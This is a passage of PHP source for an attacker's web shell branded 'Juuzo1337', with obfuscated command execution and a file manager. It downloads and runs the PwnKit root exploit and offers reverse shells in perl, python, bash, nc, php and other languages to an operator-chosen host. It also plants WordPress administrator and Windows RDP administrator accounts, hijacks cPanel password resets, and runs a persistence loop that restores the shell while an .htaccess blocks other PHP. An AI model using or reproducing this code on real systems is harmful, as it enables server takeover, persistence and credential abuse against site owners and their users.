                        $response = $fungsi[11]('.Juuzo1337-root');
                        $r_text = explode(" ", $response);
                        if ($r_text[0] == "uid=0(root)") {
                            if (isset($_POST['submit-root'])) {
                                echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                            }
                        } else {
                            echo "This Device Is Not Vulnerable\n";
                            echo cmd('cat /etc/os-release') . "\n";
                            echo "Kernel Version : " . suggest_exploit() . "\n";
                        }
                    } else {
                        $fungsi[24]('.Juuzo1337-root');
                    } ?>
                </textarea>
                <form action="" method="post" class="p-4 border-t border-slate-700 flex">
                    <input type="text" name="root-terminal" class="terminal-input flex-1 rounded-l px-3 py-2" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
                    <button type="submit" name="submit-root" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-r">
                        >
                    </button>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['re'] == true) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">Rename : <?= unx($_GET['re']) ?></h3>
                    <button class="close-btn-s text-gray-400 hover:text-white">&times;</button>
                </div>
                <form action="" method="post">
                    <input type="text" name="renameFile" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="New Name">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Submit</button>
                        <button class="close-btn-s bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">Change Permission : <?= unx($_GET['ch']) ?></h3>
                    <button class="close-btn-s text-gray-400 hover:text-white">&times;</button>
                </div>
                <form action="" method="post">
                    <input type="number" name="chFile" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="0775">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-yellow-600 hover:bg-yellow-700 text-white px-4 py-2 rounded">Submit</button>
                        <button class="close-btn-s bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <script>
        $(document).ready(function() {
            // Initialize CodeMirror
            var myTextarea = document.getElementById("code");
            if (myTextarea) {
                var editor = CodeMirror.fromTextArea(myTextarea, {
                    mode: "xml",
                    lineNumbers: true,
                    theme: "ayu-mirage",
                    extraKeys: {
                        "Ctrl-Space": "autocomplete"
                    },
                    hintOptions: {
                        completeSingle: false,
                    },
                });
            }

            // Mobile sidebar toggle
            $('.sidebar-toggle').click(function() {
                $('.sidebar').toggleClass('active');
            });
            
            $('.close-sidebar').click(function() {
                $('.sidebar').removeClass('active');
            });

            // Modal handlers
            $('#create_folder').click(function(e) {
                e.preventDefault();
                $('.modal').remove();
                $('body').append(`
                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                            <div class="flex items-center justify-between mb-4">
                                <h3 class="text-lg font-bold"><i class="fas fa-folder-plus icon-blue mr-2"></i> Create Folder</h3>
                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>
                            </div>
                            <form action="" method="post">
                                <input type="text" name="create_folder" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Folder Name">
                                <div class="flex justify-end space-x-2">
                                    <button type="submit" name="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Create</button>
                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                                </div>
                            </form>
                        </div>
                    </div>
                `);
            });

            $('#create_file').click(function(e) {
                e.preventDefault();
                $('.modal').remove();
                $('body').append(`
                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                            <div class="flex items-center justify-between mb-4">
                                <h3 class="text-lg font-bold"><i class="fas fa-file-circle-plus icon-green mr-2"></i> Create File</h3>
                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>
                            </div>
                            <form action="" method="post">
                                <input type="text" name="create_file" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="File Name">
                                <div class="flex justify-end space-x-2">
                                    <button type="submit" name="submit" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Create</button>
                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                                </div>
                            </form>
                        </div>
                    </div>
                `);
            });

            $('#lock-file').click(function(e) {
                e.preventDefault();
                $('.modal').remove();
                $('body').append(`
                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                            <div class="flex items-center justify-between mb-4">
                                <h3 class="text-lg font-bold"><i class="fas fa-lock icon-red mr-2"></i> Lock File</h3>
                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>
                            </div>
                            <form action="" method="post">
                                <input type="text" name="lockfile" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="File to Lock">
                                <div class="flex justify-end space-x-2">
                                    <button type="submit" name="submit" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded">Lock</button>
                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                                </div>
                            </form>
                        </div>
                    </div>
                `);
            });

            $('#root-user').click(function(e) {
                e.preventDefault();
                $('.modal').remove();
                $('body').append(`
                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                            <div class="flex items-center justify-between mb-4">
                                <h3 class="text-lg font-bold"><i class="fas fa-user-plus icon-green mr-2"></i> Create User</h3>
                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>
                            </div>
                            <form action="" method="post">
                                <input type="text" name="add-username" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Username">
                                <input type="text" name="add-password" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Password">
                                <div class="flex justify-end space-x-2">
                                    <button type="submit" name="submit" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Create</button>
                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                                </div>
                            </form>
                        </div>
                    </div>
                `);
            });

            $('#create-rdp').click(function(e) {
                e.preventDefault();
                $('.modal').remove();
                $('body').append(`
                    <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
                        <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                            <div class="flex items-center justify-between mb-4">
                                <h3 class="text-lg font-bold"><i class="fas fa-laptop-code icon-blue mr-2"></i> Create RDP</h3>
                                <button class="close-modal text-gray-400 hover:text-white">&times;</button>
                            </div>
                            <form action="" method="post">
                                <input type="text" name="add-rdp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Username">
                                <input type="text" name="add-rdp-pass" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Password">
                                <div class="flex justify-end space-x-2">
                                    <button type="submit" name="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Create</button>
                                    <button class="close-modal bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                                </div>
                            </form>
                        </div>
                    </div>
                `);
            });

            // Close modal handlers
            $(document).on('click', '.close-modal', function(e) {
                e.preventDefault();
                $(this).closest('.modal').remove();
            });

            $(document).on('click', '.close-btn-s', function(e) {
                e.preventDefault();
                $(this).closest('.modal').remove();
            });

            $(document).on('click', '.close-terminal', function(e) {
                e.preventDefault();
                $(this).closest('.modal').remove();
            });

            $(document).on('click', '#close-editor-btn', function(e) {
                e.preventDefault();
                $(this).closest('.modal').remove();
            });

            // Select all checkbox
            $('#select-all').change(function() {
                $('input[name="check[]"]').prop('checked', $(this).prop('checked'));
            });
            
            // Show action buttons on mobile by default
            if (window.innerWidth <= 768) {
                $('.action-btn').css('opacity', '1');
            }
        });
    </script>

    <?php
    if ($_GET['response'] == "success") {
        echo "<script>
        Swal.fire({
            icon: 'success',
            title: 'Success',
            text: 'Operation completed successfully!',
            confirmButtonColor: '#7c3aed',
            background: '#0f172a',
            color: '#e2e8f0'
        })</script>";
    } else if ($_GET['response'] == "failed") {
        echo "<script>
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'Operation failed!',
            confirmButtonColor: '#7c3aed',
            background: '#0f172a',
            color: '#e2e8f0'
        })</script>";
    }
    ?>
</body>
</html>
<?php

if (isset($_POST['submitwp'])) {
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_host = $_POST['db_host'];
    $wp_user = $_POST['wp_user'];
    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);

    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

    if ($conn->connect_error) {
        failed();
        die("Error Cug : " . $conn->connect_error);
    }

    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'Juuzo1337', '', '', NOW(), '', 0, 'Juuzo1337')";

    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";

    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
        $result = $conn->query($sqltakeuserid);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $user_id = $row["ID"];

            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";

            if ($conn->query($sqlusermeta) === TRUE) {
                Success();
            } else {
                echo "Error: " . $sqlusermeta . "\n" . $conn->error;
            }
        } else {
            echo "User tidak ditemukan.\n";
        }

        Success();
    } else {
        echo "Error: " . $sql . "\n" . $conn->error;
    }

    $conn->close();
}



if (isset($_GET['unlockshell'])) {
    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
        success();
    } else {
        failed();
    }
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['Juuzo1337-bc'] == "perl") {
        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
    } else if ($_POST['Juuzo1337-bc'] == "python") {
        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['Juuzo1337-bc'] == "ruby") {
        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['Juuzo1337-bc'] == "bash") {
        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['Juuzo1337-bc'] == "php") {
        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['Juuzo1337-bc'] == "nc") {
        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['Juuzo1337-bc'] == "sh") {
        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['Juuzo1337-bc'] == "xterm") {
        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['Juuzo1337-bc'] == "golang") {
        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}



if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){
        mkdir("' . __DIR__ . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
    }
    if (Juuzo1337_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (Juuzo1337_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function Juuzo1337_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        $php = PHP_BINARY;
        if (!is_executable($php)) {
            $php = 'php';
        }
        $cmd = $php . ' ' . $TmpNames . '/.sessions/.' . $fungsi[33](
            $fungsi[0]() . remove_dot($curFile) . '-handler') . ' > /dev/null 2>/dev/null &';
            cmd($cmd);
            success();
    } else {
        failed();
    }
}
if (isset($_POST['Juuzo1337-up-submit'])) {
    $namaFilenya = $_FILES['Juuzo1337-upload']['name'];
    $tmpName = $_FILES['Juuzo1337-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        success();
    } else {
        failed();
    }
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}
if (isset($_POST['bitninja-up-submit'])) {
    $namaFilenyaa = $_FILES['bitninja-upload']['name'];
    $tmpNamee = $_FILES['bitninja-upload']['tmp_name'];
    if ($fungsi[29]($tmpNamee, $fungsi[0]() . "/" . $namaFilenyaa)) {
        $ff = generateRandomString() .".php";
        @$GLOBALS['fungsi'][34]($namaFilenyaa,$ff);
        echo "<script>alert('Success! Your Name Files ".$ff."');</script>";
        @$GLOBALS['fungsi'][24]($namaFilenyaa);
    }else{
        failed();
    }
}
if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$fungsi[3]('adminer.php')) {
        $fungsi[28]("adminer.php", $fungsi[11]($URL));
        success();
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/ly4k/PwnKit/raw/main/PwnKit"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .Juuzo1337-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['Juuzo1337-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (is_dir($fd) || is_file($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[24]($fd);
                if ($rmdir || $rmfile) {
                    success();
                } else if ($rmdir && $rmfile) {
                    success();
                } else {
                    failed();
                }
            }
        }
    } else if ($_POST['Juuzo1337-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (ExtractArchive($fd, $repl . '/') == true) {
                success();
            } else {
                failed();
            }
        }
    } else if ($_POST['Juuzo1337-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['resetcp'] == true) {
        $emailCp = $_POST['resetcp'];
        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
        $pathcp = $path0cp . "/.cpanel/contactinfo";
        $contactinfo = '
"email" : "' . $emailCp . '"
        ';
        if ($fungsi[3]($pathcp)) {
            $fungsi[28]($pathcp, $contactinfo);
            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
        } else {
            failed();
        }
    }
    if ($_POST['create_folder'] == true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['chFile']) {
        $permString = $_POST['chFile']; 
        $permOctal = octdec($permString); 
        $chFiles = $fungsi[30](unx($_GET['ch']), $permOctal);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/ly4k/PwnKit/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .Juuzo1337-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.Juuzo1337-root')) {
            $response = $fungsi[11]('.Juuzo1337-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        cmd("chmod 444 " . $flesName);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
    }
    if (Juuzo1337_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (Juuzo1337_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}

function Juuzo1337_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            $php = PHP_BINARY;
            if (!is_executable($php)) {
                $php = 'php';
            }
            $cmd = $php . ' ' . $TmpNames . '/.sessions/.' . $fungsi[33](
                $fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &';
                cmd($cmd);
                success();
        } else {
            failed();
        }
    } else if ($_POST['add-rdp'] == True) {
        $userRDP = $_POST['add-rdp'];
        $passRDP = $_POST['add-rdp-pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
            if ($procRDP) {
                cmd("net localgroup administrators " . $userRDP . " /add");
                success();
            } else {
                failed();
            }
        } else {
            failed();
        }
    } else if ($_POST['mail-from-smtp'] == True) {
        $emailFrom = $_POST['mail-from-smtp'];
        $emailTo = $_POST['mail-to-smtp'];
        $emailSubject = $_POST['mailto-subject'];
        $messageMail = $_POST['message-smtp'];
        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
            'Reply-To: ' . $emailFrom . '' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
        if ($procMailSmTp) {
            success();
        } else {
            failed();
        }
    }
}

if ($_GET['response'] == "success") {
    echo "<script>
    Swal.fire({
        icon: 'success',
        title: 'Success!',
        text: 'Operation completed successfully!',
        confirmButtonColor: '#7c3aed',
        background: '#0f172a',
        color: '#e2e8f0',
        timer: 3000, // Auto close after 3 seconds
        showConfirmButton: true, 
        animation: true,
        customClass: {
            popup: 'animate__animated animate__fadeInDown'
        }
    });
    </script>";
} else if ($_GET['response'] == "failed") {
    echo "<script>
    Swal.fire({
        icon: 'error',
        title: 'Failed!',
        text: 'Operation failed. Please try again.',
        confirmButtonColor: '#7c3aed',
        background: '#0f172a',
        color: '#e2e8f0',
        timer: 3000, // Auto close after 3 seconds
        showConfirmButton: true, 
        animation: true,
        customClass: {
            popup: 'animate__animated animate__shakeX'
        }
    });
    </script>";
}


function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}


function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("\x65\x78\x65\x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        }
    } catch (Exception $e) {
    }
    return $out;
}


function winpwd()
{
    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
}

function compressToZip($sourceFile, $zipFilename)
{
    $zip = new ZipArchive();

    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
        $zip->addFile($sourceFile, basename($sourceFile));
        $zip->close();
        success();
    } else {
        failed();
    }
}

function remove_slash($val)
{
    $tex = str_replace("/", "", $val);
    $tex1 = str_replace(":", "", $tex);
    $tex2 = str_replace("_", "", $tex1);
    $tex3 = str_replace(" ", "", $tex2);
    $tex4 = str_replace(".", "", $tex3);
    return $tex4;
}

function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
